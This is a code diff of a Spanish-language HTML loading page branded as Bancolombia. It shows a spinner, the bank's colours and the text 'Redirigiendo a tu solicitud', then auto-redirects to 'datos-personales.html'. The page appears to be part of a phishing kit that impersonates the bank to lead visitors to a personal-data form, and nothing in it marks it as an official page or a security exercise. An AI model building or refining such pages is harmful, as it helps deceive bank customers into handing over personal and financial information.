@@ -4,47 +4,79 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirigiendo...</title>
+    <title>Redirigiendo - Bancolombia</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             margin: 0;
             padding: 0;
             background: #fff;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
-        .loading {
+
+        .loading-container {
             text-align: center;
+            padding: 20px;
         }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #005CA9;
+            margin-bottom: 30px;
+        }
+
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #FFCC00;
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #FDDA24;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 25px;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .loading-text {
+            color: #005CA9;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .loading-subtext {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-    <div class="loading">
+    <div class="loading-container">
+        <div class="logo">Bancolombia</div>
         <div class="spinner"></div>
-        <p>Redirigiendo a Bancolombia...</p>
+        <p class="loading-text">Redirigiendo a tu solicitud...</p>
+        <p class="loading-subtext">Por favor espera un momento</p>
     </div>
     
     <script>
-        // Redirigir automáticamente después de 1 segundo
+        // Redirigir automáticamente después de 1.5 segundos
         setTimeout(function() {
-            window.location.href = 'a8092.html';
-        }, 1000);
+            window.location.href = 'datos-personales.html';
+        }, 1500);
     </script>
 </body>
 </html>
